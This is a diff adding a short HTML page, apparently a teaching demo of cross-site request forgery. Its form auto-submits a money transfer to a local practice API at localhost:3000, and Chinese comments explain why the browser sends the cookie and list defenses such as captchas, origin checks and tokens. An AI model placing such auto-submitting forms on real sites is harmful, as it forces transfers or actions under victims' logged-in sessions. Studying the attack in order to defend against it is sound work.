@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+
+<body>
+    //第三方网站是拿不到cookie的，当往3000端口提交内容时，自动会提交3000的cookie
+    //表单没有跨域问题，同源策略是指ajax
+    <form name="myform" action="http://localhost:3000/api/transfer" method="post">
+        <input type="text" name="target" value="jw">
+        <input type="text" name="money" value="100">
+    </form>
+    <script>
+        document.myform.submit()
+        /* 
+        1. 添加验证码，但是体验不好
+        2. 判断来源3001发来的3000提交，
+        3. token
+        */
+    </script>
+</body>
+
+</html>
